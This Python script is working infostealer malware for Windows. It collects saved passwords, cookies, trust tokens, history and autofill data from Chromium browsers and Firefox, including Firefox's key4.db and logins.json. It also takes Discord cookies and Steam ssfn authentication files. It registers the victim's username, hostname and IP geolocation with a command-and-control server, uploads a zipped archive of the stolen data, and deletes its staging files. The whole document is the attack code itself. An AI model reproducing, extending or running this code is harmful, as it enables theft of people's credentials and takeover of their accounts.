import os
import random
import string
import time
import requests
import shutil
import uuid

def main():
    username = os.getenv('USERNAME')
    computername = os.getenv('COMPUTERNAME')
    id = uuid.uuid4().hex

    staging_file_path = os.getenv('TEMP')+"\\"+generate_file_name(8)
    os.mkdir(staging_file_path)
    url = 'http://localhost:5000/'

    check_in(username,computername, url, id)

    #browsers
    get_browsers(username, staging_file_path)

    #discord
    discord_path = rf"C:\Users\{username}\AppData\Roaming\discord\Network"
    get_discord_info(discord_path, staging_file_path)

    #Steam
    get_steam_info(staging_file_path)

    exfil(url, staging_file_path, id)

def get_browsers(username, staging_file_path):

    #chrome
    chrome_path = rf"C:\Users\{username}\AppData\Local\Google\Chrome\User Data"
    get_chromium_info(chrome_path, staging_file_path)

    #brave
    brave_path = rf"C:\Users\{username}\AppData\Local\BraveSoftware\Brave-Browser\User Data"
    get_chromium_info(brave_path, staging_file_path)

    #edge
    edge_path = rf"C:\Users\{username}\AppData\Local\Microsoft\Edge\User Data"
    get_chromium_info(edge_path, staging_file_path)

    #Opera
    opera_path = rf"C:\Users\{username}\AppData\Roaming\Opera Software\Opera Stable"
    get_chromium_info(opera_path, staging_file_path)

    #firefox
    get_ff_info(username, staging_file_path)

def get_chromium_info(browser_path, target_path):

    try:
        with open(rf"{browser_path}\Default\Login Data", "rb") as pswds:
            pswd_hex = pswds.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(pswd_hex)
    except:
        pass

    try:
        with open(rf"{browser_path}\Default\Network\Cookies", "rb") as cookies:
            cookies_hex = cookies.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(cookies_hex)    
    except:
        pass

    try:
        with open(rf"{browser_path}\Default\Network\Trust Tokens", "rb") as trust_tokens:
            trust_tokens_hex = trust_tokens.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(trust_tokens_hex)    
    except:
        pass
    
    try:
        with open(rf"{browser_path}\Default\History", "rb") as history:
            history_hex = history.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(history_hex)
    except:
        pass

    try:
        with open(rf"{browser_path}\Default\Web Data", "rb") as webdata:
            webdata_hex = webdata.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(webdata_hex)
    except:
        pass

    try:
        with open(rf"{browser_path}\Default\Top Sites", "rb") as top_sites:
            top_sites_hex = top_sites.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(top_sites_hex)
    except:
        pass

    try:
        with open(rf"{browser_path}\Default\Bookmarks", "rb") as bookmarks:
            bookmarks_hex = bookmarks.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(bookmarks_hex)
    except:
        pass

    try:
        with open(rf"{browser_path}\Default\Visited Links", "rb") as visited_links:
            visited_links_hex = visited_links.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(visited_links_hex)
    except:
        pass

def get_discord_info(discord_path, target_path):
    try:
        with open(rf"\Cookies", "rb") as discord_cookies:
            discord_cookies_hex = discord_cookies.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(discord_cookies_hex)

    except:
        pass
    try:
        with open(rf"\Trust Tokens", "rb") as discord_tts:
            discord_tts_hex = discord_tts.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(discord_tts_hex)
    except:
        pass
    
def get_steam_info(target_path):
    steam_path = r"C:\Program Files (x86)\Steam"

    for file in os.listdir(steam_path):
        if file.startswith("ssfn"):
            with open(f"{target_path}/"+generate_file_name(), "a") as output, open(steam_path + "\\" + file, "rb") as steam_info:
                output.write(steam_info.read().hex())

def get_ff_info(username, target_path):

    firefox_path = rf"C:\Users\{username}\AppData\Roaming\Mozilla\Firefox\Profiles"
    firefox_path = firefox_path + "\\" + os.listdir(firefox_path)[0]

    try:
        with open(rf"{firefox_path}\cookies.sqlite", "rb") as cookies:
            cookies_hex = cookies.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(cookies_hex)
    except:
        pass

    try:
        with open(rf"{firefox_path}\cert9.db", "rb") as certs:
            certs_hex = certs.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(certs_hex)
    except:
        pass

    try:
        with open(rf"{firefox_path}\extensions.json", "rb") as certs:
            certs_hex = certs.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(certs_hex)
    except:
        pass
    
    try:
        with open(rf"{firefox_path}\places.sqlite", "rb") as history:
            history_hex = history.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(history_hex)
    except:
        pass

    try:
        with open(rf"{firefox_path}\logins.json", "rb") as history:
            history_hex = history.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(history_hex)
    except:
        pass

    try:
        with open(rf"{firefox_path}\key4.db", "rb") as history:
            history_hex = history.read().hex()
            with open(f"{target_path}/"+generate_file_name(), "a") as output:
                output.write(history_hex)
    except:
        pass

def generate_file_name(length=6):
    random.seed(time.time())
    random_string = ''.join(random.choices(string.ascii_lowercase, k=length))
    
    return random_string

def check_in(user,computer, c2server, id):

    ipinfo = requests.get("https://ipinfo.io").json()
    public_Ip = ipinfo["ip"]
    provider = ipinfo["org"]
    country = ipinfo["country"]
    region = ipinfo["region"]

    data = {
        'user': user,
        'host': computer,
        'ip':public_Ip,
        'provider':provider,
        'country':country,
        'region':region,
        'id':id
    }

    response = requests.post(c2server+"/new_machine", json=data)

def exfil(c2server, staging_file, id):
    output_filename = os.getenv("TEMP")+"\\"+generate_file_name(1)
    shutil.make_archive(output_filename, 'zip', staging_file)
    shutil.rmtree(staging_file)

    with open(output_filename+".zip", "rb") as payload:
        data = {"id":id,"payload":payload.read().hex()}
        requests.post(c2server+"/exfil", json=data)
    os.remove(output_filename+".zip")

if __name__ == "__main__":
    main()
